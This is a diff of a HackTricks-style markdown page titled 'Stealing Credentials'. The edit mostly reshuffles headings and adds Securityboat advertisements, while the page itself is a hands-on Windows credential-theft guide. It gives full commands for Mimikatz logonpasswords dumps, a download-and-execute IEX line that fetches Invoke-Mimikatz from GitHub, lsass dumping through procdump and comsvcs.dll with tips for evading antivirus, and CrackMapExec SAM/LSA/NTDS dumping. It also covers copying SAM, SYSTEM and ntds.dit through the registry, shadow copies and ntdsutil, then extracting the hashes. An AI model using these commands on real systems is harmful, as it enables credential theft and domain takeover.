@@ -1,4 +1,4 @@
-
+# Stealing Credentials
 
 <details>
 
@@ -16,8 +16,14 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
+_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
 
-# Credentials Mimikatz
+{% embed url="https://securityboat.in/contact-us" %}
+{% endhint %}
+
+## Credentials Mimikatz
 
 ```bash
 #Elevate Privileges to extract the credentials
@@ -33,7 +39,7 @@ mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump
 
 **Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
 
-## Invoke-Mimikatz
+### Invoke-Mimikatz
 
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
@@ -43,7 +49,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 [**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
 
-# Credentials with Meterpreter
+## Credentials with Meterpreter
 
 Use the [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **that** I have created to **search for passwords and hashes** inside the victim.
 
@@ -63,11 +69,11 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::sam"
 ```
 
-# Bypassing AV
+## Bypassing AV
 
-## Procdump + Mimikatz
+### Procdump + Mimikatz
 
-As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender. \
+As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.\
 You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
 
 {% code title="Dump lsass" %}
@@ -93,7 +99,7 @@ This process is done automatically with [SprayKatz](https://github.com/aas-n/spr
 
 **Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead o**f the **name lsass.exe.**
 
-## Dumping lsass with **comsvcs.dll**
+### Dumping lsass with **comsvcs.dll**
 
 There’s a DLL called **comsvcs.dll**, located in `C:\Windows\System32` that **dumps process memory** whenever they **crash**. This DLL contains a **function** called **`MiniDumpW`** that is written so it can be called with `rundll32.exe`.\
 The first two arguments are not used, but the third one is split into 3 parts. First part is the process ID that will be dumped, second part is the dump file location, and third part is the word **full**. There is no other choice.\
@@ -108,44 +114,44 @@ We just have to keep in mind that this technique can only be executed as **SYSTE
 
 **You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-# CrackMapExec
+## CrackMapExec
 
-## Dump SAM hashes
+### Dump SAM hashes
 
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 
-## Dump LSA secrets
+### Dump LSA secrets
 
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
 
-## Dump the NTDS.dit from target DC
+### Dump the NTDS.dit from target DC
 
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
 
-## Dump the NTDS.dit password history from target DC
+### Dump the NTDS.dit password history from target DC
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
 
-## Show the pwdLastSet attribute for each NTDS.dit account
+### Show the pwdLastSet attribute for each NTDS.dit account
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 
-# Stealing SAM & SYSTEM
+## Stealing SAM & SYSTEM
 
 This files should be **located** in _C:\windows\system32\config\SAM_ and _C:\windows\system32\config\SYSTEM._ But **you cannot just copy them in a regular way** because they protected.
 
-## From Registry
+### From Registry
 
 The easiest way to steal those files is to get a copy from the registry:
 
@@ -162,11 +168,11 @@ samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 
-## Volume Shadow Copy
+### Volume Shadow Copy
 
 You can perform copy of protected files using this service. You need to be Administrator.
 
-### Using vssadmin
+#### Using vssadmin
 
 vssadmin binary is only available in Windows Server versions
 
@@ -196,7 +202,7 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 
 Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 
-## Invoke-NinjaCopy
+### Invoke-NinjaCopy
 
 Finally, you could also use the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) to make a copy of SAM, SYSTEM and ntds.dit.
 
@@ -204,12 +210,12 @@ Finally, you could also use the [**PS script Invoke-NinjaCopy**](https://github.
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
 
-# **Active Directory Credentials - NTDS.dit**
+## **Active Directory Credentials - NTDS.dit**
 
 **The Ntds.dit file is a database that stores Active Directory data**, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
 
 The important NTDS.dit file will be **located in**: _%SystemRoom%/NTDS/ntds.dit_\
-__This file is a database _Extensible Storage Engine_ (ESE) and is "officially" composed by 3 tables:
+\_\_This file is a database _Extensible Storage Engine_ (ESE) and is "officially" composed by 3 tables:
 
 * **Data Table**: Contains the information about the objects (users, groups...)
 * **Link Table**: Information about the relations (member of...)
@@ -217,9 +223,9 @@ __This file is a database _Extensible Storage Engine_ (ESE) and is "officially" 
 
 More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the **_**lsass**_** memory** (you can find the lastet accessed data probably because of the performance impruve by using a **cache**).
+Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the \_lsass**\_\*\* memory\*\* (you can find the lastet accessed data probably because of the performance impruve by using a **cache**).
 
-### Decrypting the hashes inside NTDS.dit
+#### Decrypting the hashes inside NTDS.dit
 
 The hash is cyphered 3 times:
 
@@ -229,7 +235,7 @@ The hash is cyphered 3 times:
 
 **PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
-## Copying NTDS.dit using Ntdsutil
+### Copying NTDS.dit using Ntdsutil
 
 Available since Windows Server 2008.
 
@@ -239,7 +245,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 
 You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
 
-## **Extracting hashes from NTDS.dit**
+### **Extracting hashes from NTDS.dit**
 
 Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
 
@@ -257,7 +263,7 @@ For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](ht
 
 Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject`
 
-# Lazagne
+## Lazagne
 
 Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
 
@@ -265,13 +271,13 @@ Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases)
 lazagne.exe all
 ```
 
-# Other tools for extracting credentials from SAM and LSASS
+## Other tools for extracting credentials from SAM and LSASS
 
-## Windows credentials Editor (WCE)
+### Windows credentials Editor (WCE)
 
 This tool can be used to extract credentials from the memory. Download it from: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
-## fgdump
+### fgdump
 
 Extract credentials from the SAM file
 
@@ -280,7 +286,7 @@ You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
 
-## PwDump
+### PwDump
 
 Extract credentials from the SAM file
 
@@ -290,14 +296,20 @@ PwDump.exe -o outpwdump -x 127.0.0.1
 type outpwdump
 ```
 
-## PwDump7
+### PwDump7
 
 Download it from:[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) and just **execute it** and the passwords will be extracted.
 
-# Defenses
+## Defenses
 
 [**Learn about some credentials protections here.**](credentials-protections.md)
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/SB logo black_034525.png" alt="" data-size="original">\
+_A **digital transformation** tailored to your organization is unique. It also comes with its **risks**. **Defend yourself against hackers**. Get protection before it's too late. **Talk to the professionals at Securityboat**:_
+
+{% embed url="https://securityboat.in/contact-us" %}
+{% endhint %}
 
 <details>
 
@@ -314,5 +326,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
